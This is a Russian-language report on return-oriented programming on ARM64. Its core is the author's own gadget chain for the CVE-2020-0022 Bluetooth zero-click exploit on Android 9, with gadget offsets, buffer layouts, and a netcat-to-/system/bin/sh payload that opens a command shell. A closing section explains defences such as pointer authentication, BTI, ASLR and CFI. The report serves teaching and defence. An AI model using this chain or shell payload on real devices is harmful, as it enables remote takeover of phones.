# Возвратно-ориентированное программирование на платформе ARM64

## Содержание
1. [Краткое введение в ARM64 (Aarch64)](#intro)
2. [Общий обзор возвратно-ориентированного подхода](#overview)
3. [ROP цепочка в Bluetooth эксплойте](#bluetooth_exploit)
4. [Способы защиты от ROP](#protecting)
5. [Заключение](#ending)
6. [Список используемых источников](#sources)

## Краткое введение в ARM64 (Aarch64) <a name="intro"></a>

Процессоры с ядрами ARM сейчас достаточно популярны в среде разработчиков мобильных устройств и встраиваемых систем различного применения. Самые массовые из них — это смартфоны (и iOS и Android устройства используют данную архитектуру). Архитектура обладает такими привлекательными свойствами, как удобная и эффективная система команд, мощная поддержка при разработке не только аппаратной базы, но и программного обеспечения, высокая энергоэффективность. Рассмотрим основные особенности системы команд ARM64, которые пригодятся в дальнейшем:

### Регистры

Архитектура имеет 31 регистр общего назначения (X0-X30). Все они 64-битные, но мы можем адресовать младшие 32 бита с помощью префиксов (например w0,w1 и т.д.). Также существует и 32-й регистр XZR, который равен нулю при чтении (можно применять запись в регистр, но результат вычисления не будет никуда записан). В регистр X30 (link register) записывается адрес возврата из подпрограммы.

### Инструкции

Перечислю только самые базовые инструкции:
- **mov** аналогично архитектуре x86 копирует значение одного регистра в другой, также может использоваться для загрузки непосредственного значения в регистр
```asm
mov x0, x1; копирует x1 в x0
mov x1, 0x4141; загружает значение 0x4141 в x1
```
- **str/ldr** загрузка в/из регистра соответственно по указателю
```asm
str x0, [x29]; размещает значение x0 по адресу из ОП в x29
ldr x0, [x29]; загружает значение в x0 по адресу из ОП в x29
```
- **bl/blr** эквивалентно **call** в x86 - передает управление на адрес подпрограммы и размещает адрес возврата в X30
```asm
blr x0; вызывает подпрограмму по адресу в x0
```
- **b/br** эквивалентно **jmp** в x86 - безусловный переход по адресу

- **ret** несмотря на **ret** в x86 - здесь не используется стек, а просто управление передается по адресу возврата в X30

### Способы адресации

Используется 3 основных режима:
- Непосредственный: *[base, #offset]*
```asm
ldr x0, [sp, 0x10]; загружается значение в x0 из ОП по адресу sp+0x10
```
- Пре-индексный: *[base, #offset]!*
```asm
ldr x0, [sp, 0x10]!; загружается значение в x0 из ОП по адресу sp+0x10 и затем увеличивается значение sp на 0x10
```
- Пост-индексный: *[base], #offset*
```asm
ldr x0, [sp], 0x10; загружается значение в x0 из ОП по адресу sp и затем увеличивается значение sp на 0x10
```

### Стек и соглашения о вызове функций

- Регистры X0-X7 используются для передачи параметров в подпрограммы, остальные параметры расположены на стеке
- Адрес возврата сохраняется в X30, но в случае вложенных вызовов его значение сохраняется на стеке
- Регистр X29 (frame-pointer) - эквивалент ebp в x86. Все локальные переменные на стеке доступны относительно регистра X29. А в нем самом хранится адрес предыдущего стек-фрейма.  
## Общий обзор возвратно-ориентированного подхода <a name="overview"></a>

Метод возвратно-ориентированного программирования (ROP) дает преимущество атакующей стороне в плане возможности подстраивания своего вредоносного кода под различные программные системы. Атакующий анализирует программное обеспечение системы на предмет наличия *гаджетов* - фрагментов кода, выполняющих полезную для атакующего функцию (и чаще всего заканчивающиеся инструкцией **ret**). Например:
```asm
add x0, x1, x2
ret
```
Анализируя библиотеку с кодом интересующей системы, атакующий может собрать много полезных гаджетов, выполняя которые, возможно достичь цели атакующей стороны. Такие гаджеты - реально существующий код на атакуемой системы (обычно в исполняемых секциях shared-библиотек). Это значит, что такой код можно выполнить в обход мер безопасности, предотвращающих исполнение произвольного кода. Атакующий формирует цепочку таких гаджетов, получая таким образом полноценную программу, как показано на рис. 2.1:

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/gadgets_chain.png)

Рис. 2.1 Формирование цепочки гаджетов

Другой похожий метод - Jump-Oriented Programming (JOP). Разница в них заключается в том, что выполняется поиск гаджетов, заканчивающихся на инструкцию **br/blr** (безусловный переход). Данный метод показан на рисунке 2.2:

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/JOP_chain.png)

Рис. 2.2 Jump-Oriented Programming

Обычно этот способ используется, когда нет доступа к стеку (мы не можем изначально записать в него адреса гаджетов) и в каждом гаджете приходится учитывать адрес следующего в цепочке, что гораздо сложнее реализовать, чем ROP. Но потенциально у JOP больше возможностей, так как команды **br/blr** не ограничены рамками, установленными компилятором или средой исполнения (можно передать любой валидный адрес).

## ROP цепочка в Bluetooth эксплойте <a name="bluetooth_exploit"></a>

Данный пример был написан лично мной для реализации zero-click RCE (уязвимости не требующей дополнительных действий со стороны пользователя) CVE-2020-0022. Исследователи уязвимости удалили реализацию ROP цепочки из своего кода, так как эта часть зависит от конкретного устройства. В результате становится возможным удаленно исполнять shell-команды на атакуемом устройстве от имени Bluetooth процесса.

### Суть уязвимости в двух словах
Сама уязвимость состоит в неправильном пересчете размера Bluetooth пакета (протокол L2CAP) при его фрагментации. Возникает переполнение типа int, в функцию **memcpy** передается число 0xfffffffffffffffe (-2), но из-за специфической реализации **memcpy** (в libc.so), которая выполняет копирование не побайтно, а блоками по 8 байт (размер регистров в ARM64), часть данных в echo-пакете (куда происходит копирование с помощью **memcpy**) остаются неинициализированными и содержат данные адресного пространства Bluetooth процесса (Рис 3.1). 

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/android_memcpy.png)

Рис. 3.1 Некорректное поведение функции **memcpy** при передаче 0xfffffffffffffffe (-2) - данные выделенные красным не перезаписаны и передаются в echo-пакете атакующей стороне

По этим данным и смещениям в дизассемблированной библиотеке libicuuc.so вычисляется базовый адрес libicuuc.so (откуда впоследствии будут браться гаджеты, так как никаких других базовых адресов вычислить не удалось). Буфер с гаджетами и полезной нагрузкой (команды на открытие порта на прослушивание и исполнение команд) записывается в память. Затем с помощью еще одного переполнения в библиотеке **libchrome.so** C++ объект *Signal* перезаписывается на адрес буфера и поток выполнения передается на буфер с гаджетами (примерно в 70% случаев перезапись производится неправильно и  возникает ситуация, приведенная на рис 3.2). Но после каждого аварийного завершения процесса, процесс Bluetooth запускается вновь с теми же базовыми адресами библиотек, поэтому не нужно тратить время на повторное вычисление базового адреса libicuuc.so.

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/incorrect_signal_overflow.png)

Рис. 3.2 Левая часть - crash-лог, показывающий неправильную перезапись объекта *Signal* в */system/lib64/libchrome.so*, справа - дизассемблированный код объекта *Signal*

```asm
.text:00000000000DCC4C                 LDR             X8, [X0]  ; X0 уже перезаписан
.text:00000000000DCC50                 LDR             X8, [X8]
.text:00000000000DCC54                 BLR             X8        ; получаем контроль над pc
```
Место в коде, где происходит получение контроля над потоком исполнения

Задача ROP-цепочки в данном эксплойте - вызвать функцию **system**, которая откроет на устройстве определенный порт на прослушивание и будет исполнять команды, полученные таким образом. Для этого необходимо получить адрес **system**, который изначально неизвестен, из-за рандомизации адресного пространства процесса Bluetooth (ASLR). Но, к счастью, существует функция компоновщика **dlsym**, которая принимает на вход строку - название функции и  возвращает ее адрес. Поэтому вся задача сводится к вызову **dlsym**, сохранению возвращенного значения, инициализации параметров для функции **system** и передаче потока исполнения на сохраненный адрес.

### Поиск гаджетов

Поиск нужных гаджетов в библиотеке libicuuc.so производился с помощью утилиты **ropper**. Она выводит все возможные гаджеты из файла формата ELF. Пример ее работы приведен на рис 3.3

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ropper_ex.png)

Рис. 3.3 Пример поиска гаджета ldr x0, [x0, *offset*] с помощью **ropper**

### Как производилась отладка на устройстве (Samsung galaxy S9+ Android 9)

Продемонстрирую работу эксплойта без ROP цепочки. Отладка производилась с помощью анализа crash-логов в директории */data/tombstones* (рис 3.4).

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/signal_obj_crash_v2.png)

Рис. 3.4 crash-лог эксплойта без ROP цепочки

В данном случае в буфере находится только адрес первого гаджета, поэтому в ходе **blr X8** (в X8 окажется 0x5a5a5a5a5a5a5a5a) возник **SIGBUS** (ошибка шины, при обращении к физической памяти). Наполнение буфера приведено на рис 3.5

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/g1_preview.png)

Рис. 3.5 Состояние буфера без ROP-цепочки

### u_cleanup_60

Рассмотрим дизассемблированный код C++ деструктора **u_cleanup_60** в библиотеке **libicuuc.so**. Деструктор итерируется по массиву адресов функций и каждый раз вызывает функцию, после этого зануляя элемент массива. Более детально:
1) Выполняется загрузка в регистр X8 памяти по адресу, находящемуся в X19 + offset
2) Происходит безусловный переход по адресу в регистре X8
3) С помощью X19 адрес вызванной функции в буфере зануляется

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/u_cleanup_60.png)

Рис. 3.6  Дизассемблированный код C++ деструктора **u_cleanup_60**

Этот деструктор удобен тем, что мы от Jump-oriented подхода, где надо постоянно контролировать переход на следующий гаджет, можем перейти к подобию возвратно-ориентированного подхода, просто указав подряд нужные гаджеты, только здесь роль SP будет играть X19. Таким образом, с его помощью можно перейти к гаджетам, которые заканчиваются на **ret** и не беспокоиться о перехвате потока исполнения. Единственный минус - мы лишаемся регистров X8 и X19 (так как они задействованы в **u_cleanup_60**), поэтому потенциальное число полезных гаджетов снижается.

### Перезапись регистра X19 и вызов u_cleanup_60

Перед тем, как воспользоваться **u_cleanup_60**, необходимо правильно инициализировать X19 указателем на массив функций. Для этого использовались следующие гаджеты (далее все гаджеты будут приводиться с их относительным адресом в libicuuc.so, а за указатель на начало буфера с гаджетами будет принят 0x0000007864678418, хотя в общем случае это может быть не так):

Напомню, что изначально в x0 находится указатель на начало буфера с гаджетами. 
```asm
0x0000000000128560: ldr x0, [x0, #8]; инициализация X0 адресом из буфера
                    ldr x8, [x0]; инициализация X8 - значением по этому адресу
                    ldr x2, [x8, #0x40]; инициализация X2 - значением по адресу в буфере относительно x8
                    br x2; переход на следующий гаджет
```

Гаджет 1 (Инициализация X0 адресом из буфера и X8 - значением по этому адресу. Затем - переход на следующий гаджет через адрес в буфере относительно X8)

После гаджета 1:
```asm
X0 : 0x0000007864678428 ; [адрес начала буфера + 0x8]
X8 : 0x0000007864678430 ; [X0]
X2 : gadget2            ; [X8, #0x40] 
```

```asm
0x0000000000141dfc: ldr x0, [x8, #8]; Загрузка в X0 адреса из буфера относительно X8 (далее это значение будет в X19)
                    ldr x8, [x0]; 
                    ldr x8, [x8, #0x50]; Загрузка в X8 адреса из буфера относительно X0 (адрес следующего гаджета)
                    blr x8; переход на следующий гаджет
```

Гаджет 2 (Предварительная запись X0 значением для дальнейшей инициализации X19)

После гаджета2:
```asm
X0 : 0x0000007864678438
X8 : gadget3  [0x0000007864678438 + 0x50]
```

```asm
0x00000000000ed704: mov x19, x0; инициализация X19 указателем на начало массива с адресами гаджетов
                    mov x20, x1; 
                    mov x0, x20; 
                    ldr x8, [x19, #8]; Загрузка в X8 адреса из буфера относительно X19 (адрес u_cleanup_60)
                    blr x8; переход на u_cleanup_60
```

Гаджет 3 (Инициализация X19 указателем на начало массива с адресами гаджетов и вызов u_cleanup_60)

После гаджета3:
```asm
X0  : X1
X8  : 0x0000007864678440 [u_cleanup60 + offset]
X19 : 0x0000007864678438
```

*offset* задавался такой, чтобы u_cleanup60 начинал проход с адреса [X19, #0x10] (**libicuuc_base + 0xBCA10**)

```asm
0x0000000000064f00: mov x0, xzr; ret;
```
SET_X0_TO_NULL (гаджет для загрузки 0 в X0 - для отладки вызова **u_cleanup_60**, но пригодится и на следующем этапе)

На рис. 3.7 приведено наполнение буфера с гаджетами на данном этапе

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup_60_buffer.png)

Рис. 3.7 наполнение буфера с гаджетами для инициализации X19 (для каждого гаджета отдельным цветом выделены адреса в буфере, которые он использует)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup_60_result.png)

Рис. 3.8 результат вызова **u_cleanup_60** с SET_X0_TO_NULL (отмечено значение регистров X0 и PC - на каком адресе произошел **SIGBUS**)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup60_res2.png)

Рис. 3.9 состояние памяти после вызова **u_cleanup_60** с SET_X0_TO_NULL

Занулился адрес SET_X0_TO_NULL (**u_cleanup_60** проитерировался по нему и **SIGBUS** возник при попытке обращения к 0x00000000dead0007)

### Вызов dlsym

Из заголовка функции **dlsym**:

```c++
void *dlsym(void *handle, char *symbol)
```

Функция **dlsym** использует указатель на динамическую библиотеку, возвращаемую **dlopen**, и оканчивающееся нулем символьное имя, а затем возвращает адрес, указывающий, откуда загружается этот символ. Так как динамическая библиотека, в которой содержится функция **system**, уже загружена процессом Bluetooth, то можно не использовать **dlopen** и передать NULL в качестве указателя на библиотеку.

В нашем случае *handle* должен быть NULL, поэтому и использовался гаджет SET_X0_TO_NULL. Но перед вызовом **dlsym** необходимо в X1 передать указатель на строку "system\0". Для этого изменился гаджет 3 на такой что, перед вызовом **u_cleanup_60**, выполняется переход на новые гаджеты 4 и 5, которые выполняют нужную инициализацию X1.

```asm
0x00000000000bb3d4: mov x19, x0; инициализация X19 указателем на начало массива с адресами гаджетов
                    ldr x0, [x19, #0x70]; сохранение x0 для будущих целей
                    cbz x0, #0x9f3ec; 
                    ldr x8, [x0];
                    ldr x8, [x8, #8]; Загрузка в X8 адреса из буфера относительно X0 (адрес гаджета 4)
                    blr x8; переход на гаджет 4 
```
Новый гаджет 3 (сохраняет X0 для будущих целей и переходит на гаджет 4)

После нового гаджета 3:
```asm
X0  : 0x00000078646784b0 (указатель на buf)
X8  : 0x00000078646784b8 [гаджет 4]
X19 : 0x0000007864678438
```

```asm
0x000000000006e354: ldr x8, [x0]; подготовка x8 к загрузке u_cleanup60 + offset
                    ldr x1, [x8, #0x10]; в x1 загружается адрес гаджета 5
                    br x1; переход на гаджет 5
```
Гаджет 4 (подготовка X8)

После гаджета 4:
```asm
X1  : 0x00000078646784c0 [гаджет 5]
X8  : 0x00000078646784b0 (buf указывает сам на себя)
```

```asm
0x00000000000a096c: ldr x1, [x19, #0x68]; в x1 загружается адрес строки "system\0"
                    ldr x8, [x8, #0x20]; в x8 загружается адрес u_cleanup60 + offset
                    blr x8; переход на u_cleanup60 + offset
```
Гаджет 5 (инициализация X1 и вызов **u_cleanup_60**)

После гаджета 5:
```asm
X1  : 0x00000078646784a0 (адрес строки "system\0")
X8  : 0x0000007864678440 [u_cleanup60 + offset]
```

При этом в массив функций для **u_cleanup_60** добавился адрес функции **dlsym**, адрес которой относительно базового адреса libicuuc.so может быть найден через relocation table, как представлено на рис. 3.10

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/dlsym_adr.png)

Рис. 3.10 нахождение адреса **dlsym**

На рис. 3.11 приведено наполнение буфера с гаджетами на данном этапе (показано, что buf указывает сам на себя, *buf указывает на buf, system\0 - расположение строки "system\0", *system\0 указывает на нее)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/dlsym_buffer.png)

Рис. 3.11 наполнение буфера с гаджетами для вызова **dlsym** (для каждого гаджета отдельным цветом выделены адреса в буфере, которые он использует)

В результате в X6 запишется адрес **system** и останется только вызвать эту функцию со следующей полезной нагрузкой:

```python
port = randint(10000, 65535)
# открытие порта port на прослушивание и исполнение команд, поступающих через порт 4444
payload += "cat /dev/zero | toybox nc -l -p %d | /system/bin/sh 2>&1 | toybox nc 127.0.0.1 4444 | toybox nc 127.0.0.1 %d > /dev/null\x00" % (port, port)
```

### Вызов system

После вызова **dlsym** деструктор **u_cleanup_60** итерируется далее и передает управление гаджету 6:

```asm
0x000000000008e1d0: ldr x0, [x19, #0x20]; подготовка X0 для следующих этапов
                    ldr x8, [x0]; 
                    ldr x8, [x8, #0x20]; загрузка в x8 адреса гаджета 7
                    blr x8; переход на гаджет 7
``` 
Гаджет 6 (подготовка X0)

После вызова **dlsym** было решено вернуться к Jump-oriented подходу, так как было недостаточно гаджетов, оканчивающихся на **ret** и не использующих X8 и X19. Поэтому гаджет 6 передает управлению гаджету 7 и т.д.

После гаджета 6:
```asm
X0  : 0x00000078646784d8 *buf2 (указатель на buf2)
X8  : 0x00000078646784f8 [гаджет 7]
```

```asm
0x000000000012f4f0: ldr x8, [x0, #0x38]; загрузка **payload в x8
                    ldr x1, [x8, #0x18]; загрузка в x1 адреса гаджета 8
                    br x1; переход на гаджет 8
```
Гаджет 7 (загрузка в X8 двойного указателя на строку с полезной нагрузкой - аргумента **system**)

После гаджета 7:
```asm
X1 : 0x0000007864678530 [гаджет 8]
X8  : 0x0000007864678510 **payload (указатель на указатель на строку с полезной нагрузкой в конце буфера)
```

```asm
0x00000000000c45a4: ldr x0, [x8]; загрузка *payload в x0 (аргумента system)
                    ldr x3, [x8, #0x10]; загрузка в x1 адреса CALL_SYSTEM
                    br x3; переход на CALL_SYSTEM
```
Гаджет 8 (инициализация аргумента функции **system**)

После гаджета 8:
```asm
X0 : 0x0000007864678518 *payload (указатель на строку с полезной нагрузкой в конце буфера)
X3 : 0x0000007864678528 адрес CALL_SYSTEM
```

CALL_SYSTEM - обычный безусловный переход по адресу в X6 (так как адрес **system** записался в X6)

```asm
0x00000000000a28a0: br x6;
```
CALL_SYSTEM

На рис. 3.12 приведено наполнение буфера с гаджетами на данном этапе. Аналогично buf, *buf2 указывает на buf2, buf2 указывает сам на себя. Для размещения *buf2 пришлось сместить адрес начала массива с указателями на функции для **u_cleanup_60** на 0x8 (соответственно изменился offset для вызова **u_cleanup_60**)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/buffer_final.png)

Рис. 3.12 итоговое наполнение буфера с гаджетами

В результате вызова функции **system** становится возможным установить tcp - соединение с портом 4444 и отправлять команды на устройство следующим образом:

```sh
adb reverse tcp:4444 tcp:4444 # проброс порта через adb, чтобы отправлять команды на порт устройства через USB
nc -l -p 4444 # установление tcp  соединения через tcp порт 4444
# далее можно отправлять команды на устройство
```

## Способы защиты от ROP <a name="protecting"></a>

Любая библиотека, находящаяся в адресном пространстве процесса - потенциальный источник вредоносных гаджетов. Чем больше библиотека - тем разнообразнее гаджеты, что дает больше возможностей атакующей стороне. Несмотря на всю сложность поиска гаджетов, вредоносный код может даже автоматизировать этот процесс и подстраиваться под многие атакуемые системы. Но различные меры противодействия ROP атакам могут предотвратить такую возможность. Рассмотрим механизмы предотвращения ROP атак.

### Механизмы, специфичные только архитектуре ARM

#### Аутентификация указателей

Архитектура Armv8.3-A вводит такую процедуру, как аутентификация указателей. Этот механизм изначально предполагает, что все указатели являются 64-битными, но не все их разряды используются для представления адресов в памяти. Рис. 4.1  показывает разметку виртуального адресного пространства. EL0 - EL3 - т.н. уровни исключений, в контексте которых выполняются программы (EL0 - пользовательский, EL1 - ядро ОС, EL2 - гипервизор, EL3 - уровень прошивки/железа)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/Pointer_authentication.png)

Рис. 4.1  разметка виртуального адресного пространства

На разметке слева видно два диапазона по 2^52 байт  
- Сверху 0xFFF0_0000_0000_0000 - 0xFFFF_FFFF_FFFF_FFFF - пространство ядра
- Снизу 0x0000_0000_0000_0000 - 0x000F_FFFF_FFFF_FFFF - пользователя

Каждый адрес, не попадающий в свой считается не валидным и при обращении к нему возникает segmentation fault.
Как видно на рис. 4.3, в виртуальном адресном пространстве адресуются только 12 разрядов адреса. Когда включен механизм аутентификации указателей, старшие разряды используются для хранения кода аутентификации (Pointer Authentication Code - PAC) и не считаются частью адреса. На рис. 4.2 показана структура PAC. Бит 55 используется для обозначения, какая часть PAC будет использоваться.

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/Pointer_Diagrams_Diagram_3.png)

Рис. 4.2  структура PAC

Реальное число разрядов, доступное PAC зависит от размера виртуального адресного пространства.
Для защиты от ROP атак в начале выполнения функции адрес возврата в link-register (X30) подписывается. PAC добавляется в старшие разряды X30 и используется при возврате из функции. На рис 4.3 показан пример такой ситуации:

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/Section_of_Code.png)

Рис. 4.3  сгенерированный компилятором код с использованием аутентификации указателей

Данное введение затрудняет эксплуатацию ROP цепочки, так как для того, чтобы сформировать ее, атакующему нужно знать точное расположение гаджетов в памяти (корректно подписанные указатели на эти гаджеты)

#### Формирование PAC

Armv8.3-A предоставляет пять 128-битных ключей. Каждый из этих ключей находится в паре 64-битных регистров:
- Два ключа, A и B, для указателей на инструкции
- Два ключа, A и B, для указателей на данные
- Один ключ для общего использования

Регистры, в которых хранятся эти ключи, доступны на уровнях EL1 и выше. Процесс формирования PAC показан на рис. 4.4

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/PAC.png)

Рис. 4.4 формирование PAC

Инструкции, которые формируют PAC, указывают, что *modifier* является либо регистром общего назначения, либо нулем. *modifier* обязан быть одинаковым в начале и конце функции. Например, регистр SP (stack-pointer) может иметь новое значение каждый раз при новом вызове функции, но останется неизменным в течение одного вызова функции. Поэтому, используя его в качестве *modifier*, PAC будет валидным только в течение вызова одной функции, так как для следующих вызовов его значение изменится.

Проверка PAC показана на рис. 4.5

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/PAC_check.png)

Рис. 4.5 проверка PAC

Процедура аутентификации заново формирует значение PAC и сравнивает его со значением, хранящимся в указателе. Если их значения не совпадают, формируется ошибка.

Несмотря на все преимущества от использования PAC, его размер зависит от размера доступной памяти виртуального пространства, поэтому их можно попытаться подобрать за сравнительно небольшое время (особенно на системах с малым объемом ОП).

### Branch target instructions

Данный механизм предназначен для противодействия Jump-oriented методу. Архитектура Armv8.5-A вводит специальные Branch Target команды, которые также называются "посадочными площадками". Код может быть так оптимизирован, что в результате безусловного перехода управление передается только на эти инструкции-"посадочные площадки". Если по адресу перехода находится другая инструкция, генерируется Branch Target Exception. Процесс представлен на рис. 4.6

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/Section_of_Code_JOP.png)

Рис. 4.6 Branch target instructions

Поддержка Branch target instructions реализована следующим образом: для каждой страницы памяти в виртуальном адресном пространстве устанавливается специальный бит (GP bit) для поддержки данных инструкций. Данный механизм представлен на рис 4.7 

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/branch_target_checking.png)


Рис. 4.7 поддержка Branch target instructions в ARM

Для неоптимизированного legacy-кода, которому требуются такие перехода, GP bit устанавливается в 0. Поэтому код с Branch target instructions может исполняться и на старых системах.

### Общие механизмы противодействия ROP

#### ASLR

ASLR (address space layout randomization) — это технология, созданная для усложнения эксплуатации некоторого класса уязвимостей, применяемая в некоторых современных операционных системах. ASLR выполняется ядром операционной системы и, в целом, не зависит от архитектуры. Основной принцип данной технологии заключается в устранении заведомо известных атакующему адресов адресного пространства процесса. В частности, адресов, необходимых для того, чтобы:

- передать управление на исполняемый код
- построить цепочку ROP-гаджетов
- прочитать (перезаписать) важные значения в памяти

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ASLR1.png)

Рис. 4.8 рандомизация адресного пространства процесса

Существуют даже разные режимы работы ASLR:

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ASLR2.png)

Рис. 4.9 режимы работы ASLR

За время существования ASLR были созданы разные методики обхода этой технологии, среди которых можно выделить следующие типы:

- Утечка адресов — некоторые уязвимости позволяют злоумышленнику получать необходимые для атаки адреса, что и позволяет обходить ASLR
- Относительная адресация — некоторые уязвимости позволяют злоумышленнику получать доступ к данным относительно некоторого адреса, за счет чего осуществлять обход ASLR
- Слабости реализации — некоторые уязвимости позволяют злоумышленнику угадать необходимые адреса из-за малой энтропии или свойств конкретной реализации ASLR
- Побочные эффекты работы аппаратуры — особенности работы процессора, позволяющие обойти ALSR

#### Control-flow integrity

Целостность потока управления (CFI) - это механизм безопасности, который запрещает вносить изменения в исходный граф потока управления скомпилированного двоичного файла, что значительно усложняет выполнение таких атак. CFI усложняет для злоумышленника захват контроля над исполнением программы, делая невозможными некоторые способы переиспользования уже существующих частей машинного кода. 

CFI используется компиляторами GCC и Clang (поэтому присутсвует и в Android, но в Bluetooth эксплойте перезаписываемый объект **Signal** находится в библиотеке libchrome.so, которая была скомпилирована без использования этого механизма, что и позволило эксплуатировать уязвимость).

##### Прямые переходы (условные и безусловные переходы, а также вызовы функций)

Один из способов реализации CFI для прямых переходов заключается в том, что можно проанализировать программу и определить множество легальных адресов для различных инструкций перехода. Для построения такого множества обычно применяется статический анализ кода на каком-либо уровне абстракции (на уровне исходного кода, внутреннего представления анализатора или машинного кода). Затем с помощью полученной информации рядом с инструкциями косвенного перехода вставляется код для проверки, соответствует ли адрес, полученный во время исполнения, вычисленному статически. При расхождении программа, обычно, аварийно завершается. Таким образом, граф потока управления ограничивается только теми рёбрами (вызовами функций) и вершинами (точками входа в функции), которые вычисляются во время статического анализа, поэтому при попытке модифицировать указатель, использующийся для косвенного перехода, злоумышленник потерпит неудачу.

Данный способ позволяет предотвратить Jump-oriented атаки, так как этот подход активно использует прямые косвенные переходы.

##### Обратные переходы (возврат из функции)

Для обратных переходов возможно несколько подходов к реализации CFI:

Первый подход основывается на тех же предположениях, что и CFI для прямых переходов, то есть на возможности вычислить адреса возврата из функции.

Второй подход заключается в особом обращении с адресом возврата. Помимо того, чтобы просто сохранять его на стек, он сохраняется, возможно с некоторыми модификациями, ещё и в специально выделенное для него место (например, в один из регистров процессора). Также перед инструкцией возврата добавляется код, восстанавливающий адрес возврата и сверяющий его с тем, который лежит на стеке.

Третий подход требует дополнительную поддержку от аппаратной части. Совместно с CFI используется теневой стек - специальная недоступная злоумышленнику область памяти, в которую сохраняются адреса возврата при вызове функций.

При реализации схем CFI для обратных переходов возможно предотвратить атаки ROP, основанные на изменении адреса возврата на стеке.

## Заключение <a name="ending"></a>

Несмотря на всю гибкость возвратно-ориентированного программирования, эта техника, как правило, является лишь небольшой частью основного эксплойта. Существует множество способов ограничить ROP-атаки. С усовершенствованием механизмов безопасности как на уровне ОС, так и на уровне архитектуры команд, эксплуатация ROP атак становится практически невозможной. C другой стороны, возвратно-ориентированный подход особенно хорошо показывает себя, когда остальные виды атак на системы не применимы. 

## Список используемых источников <a name="sources"></a>

1. **CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag** - (https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/)
2. **Return-oriented programming in ARM** - (https://developer.arm.com/architectures/learn-the-architecture/providing-protection-for-complex-software/return-oriented-programming)
3. **ROP-ing on Aarch64 - The CTF Style** - (https://blog.perfect.blue/ROPing-on-Aarch64)
4. **Control-flow integrity** - (https://ru.wikipedia.org/wiki/Control-flow_integrity)
5. **Портирование ОС на Aarch64** - (https://habr.com/ru/company/embox/blog/463417/)
